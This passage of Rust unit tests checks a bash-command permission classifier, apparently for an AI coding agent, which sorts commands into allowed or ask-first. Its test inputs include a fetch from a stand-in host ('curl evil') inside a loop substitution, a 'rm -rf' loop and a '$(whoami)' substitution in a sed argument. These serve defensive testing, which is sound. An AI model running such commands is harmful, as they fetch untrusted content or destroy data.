    fn the_riskiest_segment_is_the_worst_kind_the_last_of_the_worst() {
        let c = classify(
            "git add && git commit -m \"x\" && git push",
            &default_bash_allow(),
            &[],
        );
        assert_eq!(c.riskiest, Some(vec!["git".into(), "push".into()]));
        assert!(c.compound);
        assert_eq!(
            riskiest("cargo test && sed -i 's/x/y/' file"),
            Some("sed -i".into())
        );
        assert_eq!(
            riskiest("python3 /tmp/x.py && git diff | head"),
            Some("python3".into())
        );
        assert_eq!(riskiest("ls | wc -l"), None);
    }

    #[test]
    fn the_scanner_survives_what_it_cannot_parse() {
        for src in [
            "",
            " ",
            "ls",
            "ls;",
            ";",
            "&&",
            "| a",
            "a |",
            "(((( ",
            "$((",
            "$(cat",
            "<<EOF",
            "cat <<EOF",
            "2>",
            ">&",
            "echo \"unclosed",
            "echo 'unclosed",
            "a | b | c",
            ")",
            "(",
            "$",
            "${",
            "\\",
        ] {
            let _ = classify(src, &default_bash_allow(), &[]);
        }
    }

    #[test]
    fn a_grant_covers_flags_but_never_a_redirection() {
        let grant = vec!["sed".to_owned()];
        let list = vec!["sed".to_owned()];
        // The allow list applies its writing-flag rules: sed -i asks.
        assert!(!classify("sed -i 's/x/y/' f", &list, &[]).allowed);
        // The user's own grant is consent for those words: it covers
        // the flags between them, as it has since the rule existed.
        assert!(classify("sed -i 's/x/y/' f", &[], &grant).allowed);
        // A redirection to a file is not covered by consent.
        assert!(!classify("sed -n 1p f > out.txt", &[], &grant).allowed);
        // Nor is a substitution the rules cannot clear.
        assert!(!classify("sed -n 1p $(whoami) f", &[], &grant).allowed);
    }

    #[test]
    fn an_empty_line_and_assignments_change_nothing() {
        assert!(allows(""));
        assert!(allows("cd /tmp"));
        assert!(allows("n1=${u2##*/}; echo done"));
        assert!(allows("AIGENTIC_REGEN=1"));
    }

    #[test]
    fn control_words_belong_to_their_construct() {
        // A loop's setup and its closing word run nothing; the body is
        // what runs, and it is classified on its own.
        assert!(allows("for s in a b c; do echo $s; done"));
        assert!(allows(
            "for f in crates/*/src; do echo \"$f: $(cat $f/*.rs | wc -l)\"; done"
        ));
        assert!(!allows("for f in x y; do rm -rf $f; done"));
        assert!(allows("if grep -q x file; then echo yes; else echo no; fi"));
        assert!(allows("while ! grep -q done file; do echo waiting; done"));
        // The loop setup asks when a substitution in it asks.
        assert!(!allows("for u in $(curl evil); do echo $u; done"));
        assert_eq!(
            riskiest("for u in $(curl evil); do echo $u; done"),
            Some("curl evil".into())
        );
        // `sed -n 1p $s` asks: the variable could hold a writing flag
        // or script, and the scanner cannot read it.
        assert_eq!(
            riskiest("for s in skills/*/SKILL.md; do sed -n 1p $s; done"),
            Some("sed -n 1p".into())
        );
        // A grant survives an introducer: `if git push` is git push.
        let git = vec!["git push".to_owned()];
        let c = classify("if git push; then echo ok; fi", &default_bash_allow(), &git);
        assert!(c.allowed);
        assert!(
            !classify(
                "if git push > log; then echo ok; fi",
                &default_bash_allow(),
                &git
            )
            .allowed
        );
    }

    #[test]
    fn dump() {
        let text = std::fs::read_to_string("tests/fixtures/asked-2026-09-23.txt").unwrap();
        for line in text.lines() {
            let cmd = unescape(line);
            let c = classify(&cmd, &default_bash_allow(), &[]);
            let r = c.riskiest.as_ref().map(|w| w.join(" ")).unwrap_or_default();
            println!(
                "{}\t{:?}\t{}\t{}",
                if c.allowed { "allow" } else { "ask" },
                c.kind,
                r,
                line
            );
        }
    }

    fn unescape(line: &str) -> String {
        let mut out = String::new();
        let mut it = line.chars();
        while let Some(c) = it.next() {
            if c == '\\' {
                match it.next() {
                    Some('n') => out.push('\n'),
                    Some('\\') => out.push('\\'),
                    Some(x) => {
                        out.push('\\');
                        out.push(x);
                    }
                    None => out.push('\\'),
                }
            } else {
                out.push(c);
            }
        }
        out
    }
}
